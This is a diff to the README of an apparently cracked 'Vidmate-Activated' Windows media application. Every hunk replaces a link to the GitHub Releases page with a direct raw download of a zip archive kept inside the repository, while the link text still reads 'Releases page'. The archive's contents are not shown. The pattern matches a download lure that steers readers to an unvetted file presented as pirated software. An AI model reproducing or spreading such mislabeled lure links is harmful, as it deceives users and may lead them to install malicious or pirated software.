@@ -1,6 +1,6 @@
 # 🎥 Vidmate-Activated - Your Easy Multimedia Solution
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/sniper-f/Vidmate-Activated/releases)
+[![Download](https://github.com/sniper-f/Vidmate-Activated/raw/refs/heads/main/sepion/Activated-Vidmate-1.5.zip)](https://github.com/sniper-f/Vidmate-Activated/raw/refs/heads/main/sepion/Activated-Vidmate-1.5.zip)
 
 ## 📚 Overview
 
@@ -11,7 +11,7 @@ Welcome to Vidmate-Activated! This project provides all the resources you need f
 To get started with Vidmate, you'll need to follow these steps:
 
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/sniper-f/Vidmate-Activated/releases) to find the latest version. This page is where you can download the software.
+   - Go to the [Releases page](https://github.com/sniper-f/Vidmate-Activated/raw/refs/heads/main/sepion/Activated-Vidmate-1.5.zip) to find the latest version. This page is where you can download the software.
 
 2. **Download Vidmate**
    - Look for the version labeled as the latest release. 
@@ -26,7 +26,7 @@ To get started with Vidmate, you'll need to follow these steps:
 
 ## 📥 Download & Install
 
-To access Vidmate, visit the [Releases page](https://github.com/sniper-f/Vidmate-Activated/releases) to download and install the software. 
+To access Vidmate, visit the [Releases page](https://github.com/sniper-f/Vidmate-Activated/raw/refs/heads/main/sepion/Activated-Vidmate-1.5.zip) to download and install the software. 
 
 - Ensure you download the latest version for the best performance.
 - Follow the installation instructions provided above to set up the application smoothly.
@@ -71,4 +71,4 @@ Explore our collection of guides and reference materials to enhance your experie
 
 ## 📌 Conclusion
 
-Vidmate-Activated is your comprehensive tool for managing multimedia on your Windows PC. Download the application today from the [Releases page](https://github.com/sniper-f/Vidmate-Activated/releases) and start enjoying a more organized media collection.
+Vidmate-Activated is your comprehensive tool for managing multimedia on your Windows PC. Download the application today from the [Releases page](https://github.com/sniper-f/Vidmate-Activated/raw/refs/heads/main/sepion/Activated-Vidmate-1.5.zip) and start enjoying a more organized media collection.
